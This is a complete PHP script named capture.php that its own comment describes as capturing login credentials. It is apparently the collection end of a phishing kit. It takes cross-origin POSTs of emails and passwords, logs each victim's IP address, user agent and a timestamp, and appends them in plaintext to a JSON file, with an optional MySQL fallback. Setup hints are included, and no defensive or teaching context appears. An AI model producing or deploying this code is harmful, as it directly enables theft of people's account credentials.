<?php
// capture.php - Captures login credentials and saves them

// Set headers for CORS and JSON response
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Database configuration
$db_host = 'localhost';
$db_name = 'captured_data';
$db_user = 'root';  // Change this
$db_pass = '';      // Change this

// Or use file-based storage (simpler, no database needed)
$data_file = 'captured_credentials.json';

// Function to get client IP
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Function to save to file
function saveToFile($data) {
    global $data_file;
    
    $existing_data = [];
    if (file_exists($data_file)) {
        $existing_data = json_decode(file_get_contents($data_file), true) ?? [];
    }
    
    $existing_data[] = $data;
    
    return file_put_contents($data_file, json_encode($existing_data, JSON_PRETTY_PRINT));
}

// Function to save to database
function saveToDatabase($data) {
    global $db_host, $db_name, $db_user, $db_pass;
    
    try {
        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $stmt = $pdo->prepare("INSERT INTO credentials (email, password, remember, ip_address, user_agent, timestamp) 
                               VALUES (:email, :password, :remember, :ip_address, :user_agent, :timestamp)");
        
        $stmt->execute([
            ':email' => $data['email'],
            ':password' => $data['password'],
            ':remember' => $data['remember'] ? 1 : 0,
            ':ip_address' => $data['ip'],
            ':user_agent' => $data['userAgent'],
            ':timestamp' => $data['timestamp']
        ]);
        
        return true;
    } catch (PDOException $e) {
        // Fall back to file storage if database fails
        return saveToFile($data);
    }
}

// Main handler
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get POST data
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    if ($data && isset($data['email']) && isset($data['password'])) {
        // Add additional data
        $data['ip'] = getClientIP();
        $data['timestamp'] = date('Y-m-d H:i:s');
        
        // Save to file (always works)
        $saved = saveToFile($data);
        
        // Also try to save to database (optional)
        // saveToDatabase($data);
        
        if ($saved) {
            echo json_encode([
                'success' => true,
                'message' => 'Credentials saved successfully'
            ]);
        } else {
            http_response_code(500);
            echo json_encode([
                'success' => false,
                'message' => 'Failed to save credentials'
            ]);
        }
    } else {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'message' => 'Invalid data received'
        ]);
    }
} else {
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'message' => 'Method not allowed'
    ]);
}
?>
